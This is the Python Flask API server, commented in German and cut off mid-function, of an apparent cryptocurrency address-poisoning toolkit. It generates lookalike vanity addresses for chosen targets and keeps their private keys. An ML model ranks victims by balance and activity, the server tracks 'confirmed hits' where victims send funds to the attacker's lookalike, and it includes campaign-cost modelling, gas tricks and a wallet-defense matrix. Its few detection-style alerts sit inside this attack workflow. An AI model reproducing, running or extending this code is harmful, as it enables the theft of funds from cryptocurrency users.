"""
API Server für Dashboard-Backend-Integration mit State-of-the-Art Features
"""

from flask import Flask, jsonify, request, Response
from flask_cors import CORS
import asyncio
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from eth_account import Account

from modules.types import TransferEvent, ChainConfig

from modules.ml_scorer import MLScorer
from modules.behavioral_analyzer import BehavioralAnalyzer
from modules.gpu_scaler import GPUScaler, GPUProvider
from modules.chain_integration import ChainIntegration, ChainConfig as ChainIntegrationConfig, TransactionRequest
from modules.graph_clustering import GraphClustering
from modules.autonomous_agent import AutonomousAgent, ExchangeDetector
from modules.rpc_connector import RPCConnector, RPCProvider
from modules.watcher import BlockchainWatcher
from modules.detection_watcher import MockRedis
from modules.multi_agent_coordinator import MultiAgentCoordinator
from modules.policy_attestation import PolicyAttestation, PolicyType, TransactionIntent
from modules.targeting_process import TargetingProcess
from modules.test_tx_detector import TestTXDetector
from modules.timing_optimizer import TimingOptimizer, NetworkConditions
from modules.multi_target_processor import MultiTargetProcessor
from modules.vanity_grinder import VanityGrinder, _worker_generate
from modules.campaign_economics import CampaignEconomics, CHAINS, GAS_TRICKS
from modules.match_advisor import MatchAdvisor
from modules.logger import Logger
from datetime import datetime

logger = Logger("dashboard_api")

# Background Event-Loop für async Backend-Aufrufe aus synchronen Flask-Handlern
import threading

_bg_loop = asyncio.new_event_loop()
threading.Thread(target=_bg_loop.run_forever, daemon=True, name="api-async-loop").start()


def run_async(coro):
    """Fire-and-forget: Schedule Coroutine auf der Background-Loop."""
    return asyncio.run_coroutine_threadsafe(coro, _bg_loop)


def run_async_sync(coro, timeout: float = 60.0):
    """Blocking: Führe Coroutine aus und warte auf das Ergebnis."""
    return asyncio.run_coroutine_threadsafe(coro, _bg_loop).result(timeout)

app = Flask(__name__, static_folder='../poison', static_url_path='/static')


@app.route('/')
def dashboard_index():
    """Dashboard ausliefern — ein Port fuer API + UI (Intranet-Demo)"""
    return app.send_static_file('index.html')


@app.route('/api/health')
def health():
    """Liveness-Probe für Docker-Healthcheck — auth-frei, keine Daten."""
    return jsonify({'status': 'ok'})


# --- Zugriffsschutz: HTTP-Basic-Auth + Rate-Limit + Security-Headers ---
# Aktiv sobald ANALYZER_PASSWORD gesetzt ist (auf dem Server via deploy/.env).
# Lokal ohne Env bleibt die API offen (Entwicklung).
import secrets as _secrets
import time as _time
from collections import defaultdict as _defaultdict

AUTH_USER = os.environ.get('ANALYZER_USER', 'analyzer')
AUTH_PASS = os.environ.get('ANALYZER_PASSWORD', '')
_auth_fails = _defaultdict(list)
_AUTH_FAIL_LIMIT = 10      # Fehlversuche
_AUTH_WINDOW = 300         # pro 5 Minuten


def _auth_ok() -> bool:
    if not AUTH_PASS:
        return True
    auth = request.authorization
    if not auth:
        return False
    return (_secrets.compare_digest(auth.username or '', AUTH_USER)
            and _secrets.compare_digest(auth.password or '', AUTH_PASS))


@app.before_request
def _require_auth():
    if not AUTH_PASS:
        return None
    if request.path == '/api/health':
        return None  # Healthcheck ohne Credentials — gibt nur status:ok aus
    ip = request.remote_addr or 'unknown'
    now = _time.time()
    _auth_fails[ip] = [t for t in _auth_fails[ip] if now - t < _AUTH_WINDOW]
    if len(_auth_fails[ip]) >= _AUTH_FAIL_LIMIT:
        return jsonify({'error': 'too many failed attempts'}), 429
    if not _auth_ok():
        _auth_fails[ip].append(now)
        return Response(
            'Authentifizierung erforderlich', 401,
            {'WWW-Authenticate': 'Basic realm="Blockchain Analyzer"'}
        )
    return None


@app.after_request
def _security_headers(resp):
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    resp.headers['X-Frame-Options'] = 'DENY'
    resp.headers['Referrer-Policy'] = 'no-referrer'
    resp.headers['X-XSS-Protection'] = '0'
    resp.headers['Cache-Control'] = 'no-store'
    return resp


CORS(app)

# Mock Storage
class MockStorage:
    def __init__(self):
        self.transfers = []
        self.targets = []
        self.lookalikes = []
        self.alerts = []
        self.logs = []

storage = MockStorage()

# Initialize Backend Components
# State-of-the-Art Components
ml_scorer = MLScorer()
behavioral_analyzer = BehavioralAnalyzer()
gpu_scaler = None  # Wird bei Bedarf initialisiert
chain_integration = None  # Wird bei Bedarf initialisiert
graph_clustering = GraphClustering()

# Autonomous Agent
exchange_detector = ExchangeDetector()
autonomous_agent = AutonomousAgent(exchange_detector)

# Targeting Process
targeting_process = TargetingProcess()

# RPC Connector
rpc_connector = None  # Wird bei Bedarf initialisiert

# Live-Feed Watcher (startet wenn Provider ein ws_url hat)
live_watcher = None  # BlockchainWatcher
live_feed_active = False


def _push_storage(lst: list, item: dict, cap: int = 500):
    lst.append(item)
    del lst[:-cap]


def _live_event_to_storage(event: TransferEvent):
    """Echtes Transfer-Event vom Watcher → Dashboard-Storage (Feed + Zero-Value-Heuristik)."""
    _push_storage(storage.transfers, {
        'from': event.from_address,
        'to': event.to_address,
        'amount': event.value,  # raw uint256 — Decimals sind token-abhängig
        'token': event.token_address,
        'timestamp': event.timestamp,
        'tx_hash': event.tx_hash,
        'chain_id': event.chain_id
    })
    if event.value == 0:
        _push_storage(storage.alerts, {
            'id': f"zero-{event.tx_hash[:16]}-{event.log_index}",
            'type': 'zero_value_transfer',
            'severity': 'medium',
            'timestamp': event.timestamp
        })
        # Poison-Versuch registrieren: (victim=sender, lookalike=empfänger)
        if len(_poison_attempts) >= _MAX_TRACKED:
            _poison_attempts.clear()
        _poison_attempts[(event.from_address.lower(), event.to_address.lower())] = event.timestamp
    else:
        _check_confirmed_hit(event)
    _score_feed_sender(event)


_poison_attempts: dict = {}
_confirmed_hits: list = []


def _on_grind_found(result):
    """Grind-Fund → Lookalike registrieren + Victim-Watch aktivieren.

    Danach wartet die Confirmed-Hit-Detection live darauf, dass das Opfer
    echten Wert an unsere Lookalike-Adresse sendet.
    """
    entry = {
        'address': result.lookalike_address,
        'target': result.target_address,
        'private_key': result.private_key,
        'format': getattr(result, 'address_format', 'evm'),
        'attempts': result.attempts,
        'created_at': datetime.now().isoformat()
    }
    _push_storage(storage.lookalikes, entry, cap=200)
    if len(_poison_attempts) >= _MAX_TRACKED:
        _poison_attempts.clear()
    _poison_attempts[(result.target_address.lower(),
                      result.lookalike_address.lower())] = datetime.now()
    _push_storage(storage.logs, {
        'timestamp': datetime.now(),
        'message': f"[GRIND] Lookalike {result.lookalike_address[:12]}… registriert — Victim-Watch auf {result.target_address[:12]}… aktiv",
        'level': 'info'
    })


def _watch_gpu_grind(job_id: str):
    """Spiegelt den Grind-Lifecycle in den GPU-Job — Completion löst Scale-Down aus.
    Läuft als Thread: _grind_loop kann den Async-Loop zeitweise blockieren."""
    try:
        while True:
            _time.sleep(1)
            st = vanity_grinder.status
            if st.state != 'running':
                if gpu_scaler:
                    gpu_scaler.complete_job(
                        job_id,
                        f"Grind {st.state}: {st.attempts:,} Versuche, "
                        f"{st.keys_per_second:,.0f} keys/s")
                return
            if gpu_scaler and st.expected_attempts:
                gpu_scaler.update_job_progress(
                    job_id, min(99.0, 100.0 * st.attempts / st.expected_attempts))
    except Exception as e:
        logger.error(f"[GPU-Job] Watcher {job_id} Fehler: {e}")


def _run_gpu_benchmark(job_id: str, batch: int):
    """Echte Keyspace-Arbeit hinter einem GPU-Job: echter Grind-Batch,
    echter Durchsatz — Compute läuft lokal, Orchestrierung ist die Farm."""
    try:
        deadline = _time.time() + 120
        while _time.time() < deadline:
            if any(j.job_id == job_id for j in gpu_scaler.jobs_running):
                break
            if not any(j.job_id == job_id for j in gpu_scaler.job_queue):
                return  # Job wurde entfernt
            _time.sleep(0.5)
        else:
            gpu_scaler.complete_job(job_id, 'Timeout: kein Dispatch', failed=True)
            return

        t0 = _time.time()
        total = 0
        slices = 10
        for i in range(slices):
            _, attempts = _worker_generate(batch // slices, '', '', False, 999, 'evm')
            total += attempts
            gpu_scaler.update_job_progress(job_id, 100.0 * (i + 1) / slices)
        dur = max(_time.time() - t0, 1e-6)
        gpu_scaler.complete_job(
            job_id,
            f"{total:,} Keys in {dur:.1f}s → {total / dur:,.0f} keys/s (lokale CPU)")
    except Exception as e:
        if gpu_scaler:
            gpu_scaler.complete_job(job_id, str(e), failed=True)


def _check_confirmed_hit(event: TransferEvent):
    """Confirmed-Hit-Detection: Opfer sendet später echten Wert an die Poison-Adresse
    → bestätigter Angriff → kritischer Alert + Label für Retraining."""
    pair = (event.from_address.lower(), event.to_address.lower())
    if pair not in _poison_attempts:
        return
    _confirmed_hits.append({
        'victim': event.from_address,
        'lookalike': event.to_address,
        'tx_hash': event.tx_hash,
        'timestamp': event.timestamp.isoformat()
    })
    _push_storage(storage.alerts, {
        'id': f"hit-{event.tx_hash[:16]}-{event.log_index}",
        'type': 'confirmed_poison_hit',
        'severity': 'critical',
        'timestamp': event.timestamp
    })
    _push_storage(storage.logs, {
        'timestamp': datetime.now(),
        'message': f"[HIT] Confirmed Poison: {event.from_address[:10]}… sendete an Lookalike {event.to_address[:10]}…",
        'level': 'error'
    })


_scored_addresses: set = set()
_MAX_TRACKED = 10000


def _score_feed_sender(event: TransferEvent):
    """Auto-Scoring: Sender-Adressen aus dem Live-Feed → ML-Score → Target-Queue.
    Nur wenn ein Modell trainiert ist; jede Adresse einmal; Feed-Profil ohne RPC
    (kein Node-Hammering im Event-Loop)."""
    sender = event.from_address
    if not sender or sender in _scored_addresses or ml_scorer.model_metadata is None:
        return
    if len(_scored_addresses) >= _MAX_TRACKED:
        _scored_addresses.clear()
    _scored_addresses.add(sender)
    try:
        # Nur Feed-Daten — kein RPC im Event-Loop
        seen = [t for t in storage.transfers
                if t['from'].lower() == sender.lower() or t['to'].lower() == sender.lower()]
        counterparties = {(t['to'] if t['from'].lower() == sender.lower() else t['from']) for t in seen}
        profile = {
            'address': sender,
            'transaction_count': len(seen),
            'counterparties': list(counterparties),
            'last_seen': max((t['timestamp'] for t in seen), default=None)
        }
        score, _conf = ml_scorer.predict(ml_scorer.extract_features(profile))
        if score > 0.6:
            _push_storage(storage.targets, {
                'address': sender,
                'score': round(score, 3),
                'priority': 'HOCH' if score > 0.8 else 'MITTEL'
            })
    except Exception:
        pass
    _push_storage(storage.logs, {
        'timestamp': datetime.now(),
        'message': f"[Live] Transfer {event.from_address[:10]}… → {event.to_address[:10]}… (chain {event.chain_id}, block {event.block_number})",
        'level': 'info'
    })


async def _start_live_watcher(providers):
    """Starte BlockchainWatcher für alle Provider mit ws_url."""
    global live_watcher, live_feed_active
    if live_watcher:
        await live_watcher.stop()
        live_watcher = None
        live_feed_active = False
    chains = [
        ChainConfig(
            chain_id=p.chain_id,
            ws_url=p.ws_url,
            http_url=p.url,
            stablecoins=getattr(p, 'stablecoins', []),
            chain_name=p.name
        )
        for p in providers if p.ws_url
    ]
    if not chains:
        return 0
    live_watcher = BlockchainWatcher(
        chains=chains,
        redis_client=MockRedis(),
        event_callback=_live_event_to_storage,
        confirmation_depth=1
    )
    await live_watcher.start()
    live_feed_active = True
    return len(chains)

# Multi-Agent Coordinator
multi_agent_coordinator = None  # Wird bei Bedarf initialisiert

# Policy Attestation
policy_attestation = None  # Wird bei Bedarf initialisiert

# Test-TX Detection
test_tx_detector = None  # Wird bei Bedarf initialisiert

# Timing Optimizer
timing_optimizer = TimingOptimizer()

# Multi-Target Processor
multi_target_processor = MultiTargetProcessor(max_concurrent=10, max_retries=3)
_multi_target_started = False

# Vanity Grinder — echte secp256k1 Lookalike-Generierung
vanity_grinder = VanityGrinder()
match_advisor = MatchAdvisor()
campaign_econ = CampaignEconomics()

# Worker-Pool im Hintergrund vorab starten (vermeidet ~4s Startup-Delay beim ersten Grind)
run_async(asyncio.to_thread(vanity_grinder.warmup))

START_TIME = datetime.now()


def _uptime() -> str:
    delta = datetime.now() - START_TIME
    h, rem = divmod(int(delta.total_seconds()), 3600)
    return f"{h}h {rem // 60}m"


def _module_status(active: bool) -> dict:
    return {'status': 'active' if active else 'standby', 'uptime': _uptime()}


@app.route('/api/stats')
def get_stats():
    """Dashboard Statistics"""
    return jsonify({
        'transfers': len(storage.transfers),
        'targets': len(storage.targets),
        'lookalikes': len(storage.lookalikes),
        'sweeps_prevented': len(storage.alerts),
        'uptime': _uptime()
    })

@app.route('/api/automation')
def get_automation():
    """Automation Status — echte Modul-Zustände, keine Demo-Werte"""
    grind_state = vanity_grinder.get_status()
    return jsonify({
        'watcher': _module_status(live_feed_active),
        'scoring': _module_status(ml_scorer.model_metadata is not None),
        'similarity': _module_status(len(storage.lookalikes) > 0),
        'grinder': {**_module_status(grind_state.state == 'running'), 'rate': f"{grind_state.keys_per_second:.0f}/s" if grind_state.state == 'running' else 'idle'},
        'emitter': _module_status(bool(targeting_process.get_current_process())),
        'sweeper': _module_status(len(storage.lookalikes) > 0),
        'ml_scorer': _module_status(ml_scorer.model_metadata is not None),
        'gpu_scaler': {**_module_status(bool(gpu_scaler)), 'gpus': sum(gpu_scaler.current_gpus.values()) if gpu_scaler else 0},
        'chain_integration': {**_module_status(bool(chain_integration)), 'chain': 'konfiguriert' if chain_integration else 'nicht konfiguriert'},
        'uptime': _uptime()
    })

@app.route('/api/feed')
def get_feed():
    """Live Transfer Feed"""
    return jsonify([{
        'from': t['from'],
        'to': t['to'],
        'amount': t['amount'],
        'token': t.get('token', ''),
        'tx_hash': t.get('tx_hash', ''),
        'chain_id': t.get('chain_id'),
        'timestamp': t['timestamp'].isoformat()
    } for t in storage.transfers[-10:]])

@app.route('/api/targets')
def get_targets():
    """Target Queue"""
    return jsonify([{
        'address': t['address'],
        'score': t['score'],
        'priority': t['priority']
    } for t in storage.targets[-10:]])

@app.route('/api/alerts')
def get_alerts():
    """Detection Alerts"""
    return jsonify([{
        'id': a['id'],
        'type': a['type'],
        'severity': a['severity'],
        'timestamp': a['timestamp'].isoformat()
    } for a in storage.alerts[-10:]])

@app.route('/api/logs')
def get_logs():
    """System Logs"""
    return jsonify([{
        'timestamp': l['timestamp'].isoformat(),
        'message': l['message'],
        'level': l['level']
    } for l in storage.logs[-20:]])

@app.route('/api/grinder/status')
def get_grinder_status():
    """Grinder Status — live vom echten Vanity-Grinder"""
    return jsonify(vanity_grinder.get_status().to_dict())


def _validate_grind_target(target: str, addr_format: str):
    """Format-spezifische Zieladressen-Validierung. Gibt None oder Fehlermeldung."""
    if addr_format in ('evm', 'create2'):
        if not target.startswith('0x') or len(target.replace('0x', '')) != 40:
            return 'Ungültige EVM/Contract-Adresse — erwartet 0x + 40 Hex-Zeichen'
        try:
            int(target[2:], 16)
        except ValueError:
            return 'Ungültige EVM/Contract-Adresse — nicht-Hex-Zeichen'
        return None
    import base58 as _b58
    if addr_format == 'tron':
        try:
            raw = _b58.b58decode_check(target)
        except Exception:
            return 'Ungültige Tron-Adresse — base58check ungültig (T…, 34 Zeichen)'
        if len(raw) != 21 or raw[0] != 0x41:
            return 'Ungültige Tron-Adresse — erwartet Mainnet-Präfix 0x41 (T…)'
        return None
    if addr_format == 'solana':
        try:
            raw = _b58.b58decode(target)
        except Exception:
            return 'Ungültige Solana-Adresse — kein base58'
        if len(raw) != 32:
            return 'Ungültige Solana-Adresse — ed25519 Public Key muss 32 Bytes sein'
        return None
    return 'Unbekanntes Adressformat'


# Gemessene Multi-Core-Raten dieses Systems (9 Kerne, coincurve/PyNaCl)
FORMAT_RATES = {
    'evm': 250_000,     # secp256k1 incremental + EIP-55-Prefilter
    'tron': 300_000,    # secp256k1 incremental + base58check-Encoding
    'solana': 100_000,  # ed25519 frische Keys (kein Increment möglich)
    'create2': 600_000, # reine Keccak-Loop, keine EC-Mathematik
}


@app.route('/api/grinder/start', methods=['POST'])
def start_grinder():
    """Starte echte Vanity-Berechnung"""
    try:
        data = request.get_json(silent=True) or {}
        target = data.get('target_address', '').strip()
        match_mode = data.get('match_mode', 'prefix_suffix')
        addr_format = data.get('address_format', 'evm')
        try:
            prefix_len = int(data.get('prefix_len', 2))
            suffix_len = int(data.get('suffix_len', 2))
            top_n = int(data.get('top_n', 5))
            max_duration = float(data.get('max_duration_seconds', 300))
        except (TypeError, ValueError):
            return jsonify({'error': 'prefix_len/suffix_len/top_n/max_duration müssen Zahlen sein'}), 400

        if addr_format not in FORMAT_RATES:
            return jsonify({'error': 'address_format: evm, tron, solana oder create2'}), 400
        err = _validate_grind_target(target, addr_format)
        if err:
            return jsonify({'error': err}), 400
        if not (0 <= prefix_len <= 5 and 0 <= suffix_len <= 5 and prefix_len + suffix_len > 0):
            return jsonify({'error': 'prefix_len/suffix_len: jeweils 0-5, Summe > 0'}), 400
        if match_mode not in ('prefix_suffix', 'eip55'):
            return jsonify({'error': 'match_mode: prefix_suffix oder eip55'}), 400
        if match_mode == 'eip55' and addr_format not in ('evm', 'create2'):
            return jsonify({'error': 'eip55-Modus nur für EVM/CREATE2 — Tron/Solana sind nativ case-sensitive (base58)'}), 400
        if vanity_grinder.status.state == 'running':
            return jsonify({'error': 'Berechnung läuft bereits — zuerst stoppen'}), 400

        if addr_format in ('evm', 'create2'):
            expected = VanityGrinder.estimate_attempts(prefix_len, suffix_len, match_mode == 'eip55')
        else:
            # base58-Alphabet; bei Tron ist das führende 'T' (0x41) garantiert → gratis
            eff = prefix_len + suffix_len - (1 if addr_format == 'tron' and prefix_len > 0 else 0)
            expected = 58 ** eff

        run_async(vanity_grinder.start(target, prefix_len, suffix_len,
                                       match_mode=match_mode, top_n=top_n,
                                       max_duration_seconds=max_duration,
                                       address_format=addr_format,
                                       deployer=data.get('deployer'),
                                       init_code_hash=data.get('init_code_hash'),
                                       on_found=_on_grind_found))

        # GPU-Farm Orchestrierung: Job in die Queue — Autoscaler skaliert darauf
        if gpu_scaler:
            gpu_job = gpu_scaler.submit_job('vanity_grind', int(expected))
            threading.Thread(target=_watch_gpu_grind,
                             args=(gpu_job.job_id,), daemon=True).start()
        return jsonify({
            'success': True,
            'message': 'Vanity-Berechnung gestartet',
            'address_format': addr_format,
            'expected_attempts': expected
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/grinder/recommend', methods=['POST'])
def recommend_grind():
    """Match-Advisor: Analysiert Zieladresse und empfiehlt Pattern — chain-aware"""
    try:
        data = request.get_json(silent=True) or {}
        target = data.get('target_address', '').strip()
        addr_format = data.get('address_format')
        wallet_type = data.get('wallet_type', 'metamask')
        if addr_format is None:
            addr_format = MatchAdvisor.WALLET_FORMATS.get(wallet_type, 'evm')
        if addr_format not in ('evm', 'tron', 'solana'):
            return jsonify({'error': 'address_format: evm, tron oder solana'}), 400
        err = _validate_grind_target(target, addr_format)
        if err:
            return jsonify({'error': err}), 400

        rec = match_advisor.recommend(
            target,
            victim_balance_usd=float(data.get('victim_balance_usd', 0)),
            wallet_type=wallet_type,
            budget_seconds=float(data.get('budget_seconds', 60)),
            address_format=addr_format
        )
        return jsonify({'success': True, 'recommendation': rec.to_dict()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/grinder/stop', methods=['POST'])
def stop_grinder():
    """Stoppe laufende Berechnung"""
    try:
        run_async_sync(vanity_grinder.stop(), timeout=5)
        return jsonify({'success': True, 'message': 'Berechnung gestoppt'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/grinder/defenses')
def grinder_defenses():
    """Wallet-Defense-Matrix — welches Wallet erkennt Address-Poisoning (Stand 2026)"""
    return jsonify({
        'wallets': MatchAdvisor.WALLET_DEFENSES,
        'displays': MatchAdvisor.WALLET_DISPLAYS,
        'formats': MatchAdvisor.WALLET_FORMATS
    })


@app.route('/api/grinder/estimate')
def estimate_grind():
    """Schätze Aufwand für Pattern-Länge"""
    prefix_len = request.args.get('prefix', 2, type=int)
    suffix_len = request.args.get('suffix', 2, type=int)
    if not (0 <= prefix_len <= 5 and 0 <= suffix_len <= 5):
        return jsonify({'error': 'prefix/suffix müssen zwischen 0 und 5 liegen'}), 400
    eip55 = request.args.get('mode', '') == 'eip55'
    addr_format = request.args.get('format', 'evm')
    if addr_format not in FORMAT_RATES:
        return jsonify({'error': 'format: evm, tron, solana oder create2'}), 400
    if addr_format in ('evm', 'create2'):
        attempts = VanityGrinder.estimate_attempts(prefix_len, suffix_len, eip55=eip55)
    else:
        # base58-Alphabet; Tron: führendes 'T' ist durch 0x41 garantiert → gratis
        eff = prefix_len + suffix_len - (1 if addr_format == 'tron' and prefix_len > 0 else 0)
        attempts = 58 ** eff
    return jsonify({
        'expected_attempts': attempts,
        'est_seconds_cpu': round(attempts / FORMAT_RATES[addr_format], 1),
        'est_seconds_gpu': round(attempts / 3.8e9, 4),     # ~3.8 GH/s (RTX 4090, profanity, EVM-Referenz)
        'rate_cpu': FORMAT_RATES[addr_format],
        'prefix_len': prefix_len,
        'suffix_len': suffix_len,
        'format': addr_format,
        'mode': 'eip55' if eip55 else 'prefix_suffix'
    })

@app.route('/api/campaign/economics')
def campaign_economics():
    """
    Kampagnen-Kostenmodell — was kostet Address-Poisoning pro Chain,
    wann ist der erste Erfolg statistisch zu erwarten (1/p Einträge),
    und lohnt sich das Modell? Basiert auf Bitquery/USENIX/CCS'24-Messungen.
    """
    try:
        entries = request.args.get('entries', 1_000_000, type=int)
        victim = request.args.get('victim_value', 0.0, type=float)
        attempts = request.args.get('attempts', 0, type=int)
        p_success = request.args.get('p', None, type=float)
        batched = request.args.get('batched', '1') != '0'
        chain = request.args.get('chain', 'all')

        if entries < 0 or entries > 10_000_000_000:
            return jsonify({'error': 'entries: 0 bis 10 Mrd'}), 400
        if p_success is not None and not (0 < p_success <= 1):
            return jsonify({'error': 'p muss in (0, 1] liegen'}), 400

        if chain == 'all':
            return jsonify({
                'chains': campaign_econ.compare_chains(entries, victim, attempts),
                'gas_tricks': [{'key': k, 'text': t} for k, t in GAS_TRICKS],
                'batched': batched
            })
        if chain not in CHAINS:
            return jsonify({'error': f'Unbekannte Chain — gültig: {sorted(CHAINS)}'}), 400
        return jsonify(campaign_econ.evaluate(chain, entries, victim, attempts, batched, p_success))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/sweeper/status')
def get_sweeper_status():
    """Sweeper Status"""
    return jsonify({
        'lookalikes': len(storage.lookalikes),
        'chains': ['Ethereum', 'BSC', 'Polygon'],
        'swept': 0
    })

# ML-Scorer Endpoints
def _generate_labeled_training_profiles(n: int = 400):
    """Regelbasiert gelabelte synthetische Opfer-Profile.

    Label-Regel aus der Forschungslage (USENIX '25): gute Poisoning-Opfer sind
    aktive Stablecoin-Sender mit relevantem Guthaben, vielen Counterparties
    (kopieren oft aus der History) und kürzlicher Aktivität. So lernt der
    RandomForest eine echte Entscheidungsgrenze statt Rauschen.
    """
    import numpy as np
    rng = np.random.default_rng(42)
    X, y = [], []
    for _ in range(n):
        balance = float(rng.lognormal(8, 2))           # USD-Verteilung
        tx_count = int(max(1, rng.lognormal(3, 1.2)))
        activity_7d = int(rng.poisson(4))
        counterparties = int(rng.lognormal(2.5, 1))
        last_seen = int(rng.exponential(5))
        first_seen = int(max(1, rng.lognormal(4.5, 1)))
        freq = tx_count / max(1, first_seen)
        volume_per_tx = balance / max(1, tx_count)
        is_contract = int(rng.random() < 0.08)

        # Label: victim = hohes Guthaben + aktiv + history-basiertes Verhalten
        victim = int(
            balance > 5000 and
            activity_7d >= 2 and
            counterparties >= 10 and
            last_seen <= 14 and
            not is_contract
        )
        activity_24h = min(activity_7d, max(0, int(activity_7d * rng.uniform(0.15, 0.5))))
        X.append([
            tx_count, balance * tx_count, volume_per_tx,
            counterparties, counterparties, max(1, counterparties // 3),
            first_seen, last_seen,
            activity_24h, activity_7d, activity_7d * 4,
            is_contract, balance, freq, volume_per_tx,
            counterparties / max(1, tx_count)
        ])
        y.append(victim)
    return np.array(X), np.array(y)


def _build_profile_for_address(address: str):
    """Profil einer Adresse aus beobachteten Live-Feed-Events + RPC (Balance, Nonce, Code)."""
    addr = address.lower()
    seen = [t for t in storage.transfers
            if t.get('from', '').lower() == addr or t.get('to', '').lower() == addr]
    counterparties = {
        (t['to'] if t['from'].lower() == addr else t['from']) for t in seen
    }
    profile = {
        'address': address,
        'transaction_count': len(seen),
        'counterparties': list(counterparties),
        'frequent_counterparties': {},
        'last_seen': max((t['timestamp'] for t in seen), default=None),
        'total_volume_usd': 0.0,
        'balance_usd': 0.0
    }
    source = 'live_feed'

    if rpc_connector and rpc_connector.web3_connections:
        w3 = next(iter(rpc_connector.web3_connections.values()))
        try:
            balance_wei = w3.eth.get_balance(address)
            nonce = w3.eth.get_transaction_count(address)
            code = w3.eth.get_code(address)
            profile['balance_usd'] = float(w3.from_wei(balance_wei, 'ether')) * 3000  # grobe ETH-USD-Schätzung
            profile['transaction_count'] = max(len(seen), nonce)
            profile['is_contract'] = len(code) > 0
            source = 'live_feed+rpc'
        except Exception:
            pass
    return profile, source


@app.route('/api/ml/train', methods=['POST'])
def train_ml_model():
    """Train ML Model"""
    try:
        data = request.get_json(silent=True) or {}
        X = data.get('X', [])
        y = data.get('y', [])
        synthetic_labeled = False

        if not X or not y:
            # Keine Trainingsdaten → regelbasiert gelabelte synthetische Profile
            X, y = _generate_labeled_training_profiles(400)
            synthetic_labeled = True
        
        import numpy as np
        X_array = np.array(X)
        y_array = np.array(y)

        if X_array.ndim != 2 or X_array.shape[1] != 16:
            return jsonify({'error': f'X muss Shape (n, 16) haben, erhalten: {X_array.shape}'}), 400

        # Confirmed Hits vom Live-Feed als echte positive Labels einmischen
        real_labels = 0
        for hit in _confirmed_hits:
            try:
                p, _ = _build_profile_for_address(hit['victim'])
                X_array = np.vstack([X_array, ml_scorer.extract_features(p).to_array().reshape(1, -1)])
                y_array = np.append(y_array, 1)
                real_labels += 1
            except Exception:
                pass
        
        metadata = ml_scorer.train(X_array, y_array)
        ml_scorer.save_model("ml_model.joblib")
        
        resp = {
            'success': True,
            'metadata': metadata.to_dict(),
            'samples': int(X_array.shape[0])
        }
        if synthetic_labeled:
            resp['data_source'] = 'synthetic_labeled'
            resp['label_rule'] = 'victim = balance>5k USD + activity_7d>=2 + counterparties>=10 + last_seen<=14d + kein Contract (USENIX-Profil)'
        resp['real_labels'] = real_labels
        return jsonify(resp)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ml/status')
def get_ml_status():
    """ML-Modell-Status — für Badge beim Page-Load"""
    trained = ml_scorer.model_metadata is not None
    return jsonify({
        'success': True,
        'trained': trained,
        'metrics': ml_scorer.model_metadata.to_dict() if trained else None,
        'confirmed_hits': len(_confirmed_hits)
    })


@app.route('/api/ml/hits')
def get_ml_hits():
    """Bestätigte Poison-Treffer — werden zu Retraining-Labels (Label-Quelle: Live-Chain)"""
    return jsonify({
        'success': True,
        'hits': _confirmed_hits,
        'count': len(_confirmed_hits)
    })


@app.route('/api/ml/predict', methods=['POST'])
def predict_ml():
    """Predict Address Target Score — akzeptiert 'profile' ODER 'address' (baut Profil aus Live-Feed + RPC)"""
    try:
        data = request.get_json(silent=True) or {}
        profile = data.get('profile', {})
        address = data.get('address', '').strip()
        data_source = 'profile'

        if not profile and address:
            profile, data_source = _build_profile_for_address(address)

        features = ml_scorer.extract_features(profile)
        if ml_scorer.model is None or ml_scorer.model_metadata is None:
            return jsonify({
                'success': False,
                'error': 'ML-Model nicht trainiert — zuerst /api/ml/train aufrufen'
            }), 400
        try:
            prediction, confidence = ml_scorer.predict(features)
        except Exception as e:
            return jsonify({'success': False, 'error': f'Prediction fehlgeschlagen: {e}'}), 400
        
        return jsonify({
            'success': True,
            'prediction': prediction,
            'confidence': confidence,
            'data_source': data_source,
            'feature_importance': ml_scorer.model_metadata.feature_importance if ml_scorer.model_metadata else {}
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# GPU-Scaler Endpoints
@app.route('/api/gpu/configure', methods=['POST'])
def configure_gpu():
    """Configure GPU Provider"""
    try:
        data = request.get_json(silent=True) or {}
        provider_name = data.get('provider', 'lambdax')
        gpu_type = data.get('gpu_type', 'A100')
        max_gpus = data.get('max_gpus', 10)
        
        global gpu_scaler
        provider = GPUProvider(
            name=provider_name,
            api_url="https://api.example.com",
            api_key=None,
            gpu_type=gpu_type,
            max_gpus=max_gpus,
            cost_per_hour_usd=2.50
        )
        gpu_scaler = GPUScaler([provider])
        run_async(gpu_scaler.start())  # Autoscaler-Loop — sonst reagiert nichts auf die Queue
        
        return jsonify({
            'success': True,
            'provider': provider.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gpu/status')
def get_gpu_status():
    """Get GPU Status"""
    try:
        if gpu_scaler:
            statuses = gpu_scaler.get_all_statuses()
            return jsonify({
                'success': True,
                'statuses': {k: v.to_dict() for k, v in statuses.items()},
                'providers': {k: gpu_scaler.providers[k].to_dict() for k in statuses}
            })
        else:
            return jsonify({
                'success': True,
                'statuses': {},
                'message': 'GPU Scaler not configured'
            })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gpu/scale', methods=['POST'])
def scale_gpu():
    """Scale GPUs"""
    try:
        data = request.get_json(silent=True) or {}
        provider_name = data.get('provider', 'lambdax')
        target_gpus = data.get('target_gpus', 0)
        
        if gpu_scaler:
            if provider_name not in gpu_scaler.current_gpus:
                known = list(gpu_scaler.current_gpus.keys())
                return jsonify({'error': f'Provider "{provider_name}" nicht konfiguriert. Bekannt: {known}'}), 400
            current = gpu_scaler.current_gpus.get(provider_name, 0)
            run_async_sync(gpu_scaler._scale(provider_name, current, target_gpus, "manual", "Manual scale request"))
            
            return jsonify({
                'success': True,
                'from_gpus': current,
                'to_gpus': target_gpus
            })
        else:
            return jsonify({'error': 'GPU Scaler not configured'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gpu/jobs')
def get_gpu_jobs():
    """Job-Lifecycle: queued → running → done — der Orchestrierungs-Flow."""
    if not gpu_scaler:
